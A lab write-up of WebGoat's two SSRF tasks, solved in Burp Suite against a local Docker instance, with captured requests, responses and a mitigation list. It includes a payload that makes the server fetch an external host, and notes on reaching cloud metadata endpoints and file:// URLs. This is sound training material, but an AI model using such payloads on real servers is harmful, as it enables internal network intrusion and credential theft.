# WebGoat — Server-Side Request Forgery (SSRF)

**Lab:** WebGoat (Docker)  
**Tool:** Burp Suite Community Edition v2026.7.1  
**Target:** `http://192.168.122.84:8080/WebGoat`

---

## Overview

Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks a server into making unintended HTTP requests to internal or external resources. WebGoat's SSRF lesson contains two tasks that demonstrate how a poorly validated URL parameter can be abused to make the server fetch arbitrary content.

---

## Task 1: Display Jerry

**Objective:** Modify the request so the server returns an image of Jerry instead of Tom.

The application presents a button that sends a POST request to `/WebGoat/SSRF/task1` with a `url` parameter pointing to `images/tom.png`. Since no validation is performed on the `url` parameter, we can simply change the filename.

### Steps

1. Intercept the POST request in Burp Suite.
2. Change the request body from:
   ```
   url=images%2Ftom.png
   ```
   to:
   ```
   url=images%2Fjerry.png
   ```
3. Forward the modified request.

### Response

```json
{
  "lessonCompleted": true,
  "feedback": "You rocked the SSRF!",
  "output": "<img class=\"image\" alt=\"Jerry\" src=\"images/jerry.png\" width=\"25%\" height=\"25%\">",
  "assignment": "SSRFTask1",
  "attemptWasMade": true
}
```

### Screenshot

![WebGoat SSRF Task 1 — Burp Request & Response](webgoat-ssrf-task1.png)

**Key Takeaway:** The server blindly fetches whatever path is passed in the `url` parameter. By changing `tom.png` to `jerry.png`, we made the server fetch a different image from the same directory — a simple but effective demonstration of SSRF.

---

## Task 2: Fetch from an External URL

**Objective:** Make the server send a request to `http://ifconfig.pro` and return the response.

This task takes SSRF a step further — instead of just changing a filename, we point the server to a completely different external host.

### Steps

1. Intercept the POST request to `/WebGoat/SSRF/task2` in Burp Suite.
2. Replace the `url` parameter value from a local image path to an external URL:
   ```
   url=http://ifconfig.pro
   ```
3. Forward the request.

### Response

```json
{
  "lessonCompleted": true,
  "feedback": "You rocked the SSRF!",
  "output": "<title>IP: 49.43.156.225 info</title>...",
  "assignment": "SSRFTask2",
  "attemptWasMade": true
}
```

The server fetched `http://ifconfig.pro` and returned its content, which included the server's public IP address (`49.43.156.225`) and other connection details.

### Screenshot

![WebGoat SSRF Task 2 — Burp Request & Response](webgoat-ssrf-task2.png)

**Key Takeaway:** The server made an outbound HTTP request to an arbitrary external URL on our behalf. An attacker could use this technique to:
- Scan internal networks behind firewalls
- Access cloud metadata endpoints (e.g., `http://169.254.169.254/`)
- Read local files using `file://` scheme
- Interact with internal services that should not be exposed

---

## Mitigation

To prevent SSRF vulnerabilities:

- **Whitelist allowed domains or URL patterns** — never allow arbitrary URLs
- **Validate and sanitize input** — reject private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- **Disable unnecessary URL schemes** — block `file://`, `dict://`, `gopher://` unless required
- **Use allowlists instead of blocklists** — blocklists are easily bypassed
- **Authenticate internal services** — assume requests from the server could be malicious
